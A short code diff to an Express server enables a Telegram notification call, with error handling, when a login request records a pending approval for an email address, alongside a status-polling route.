@@ -17,11 +17,15 @@ app.post("/send-login", async (req, res) => {
 
   pendingApprovals[email] = { status: "pending" };
 
-  // Remove this line to prevent backend Telegram message from going first
-  // await sendLoginTelegram(email);
+  try {
+    await sendLoginTelegram(email); // <--- call the bot here
+  } catch (err) {
+    console.error("Failed to send Telegram message:", err);
+  }
 
   res.json({ status: "ok" });
 });
+
 
 // Check status polling
 app.post("/check-status", (req, res) => {
@@ -42,4 +46,5 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
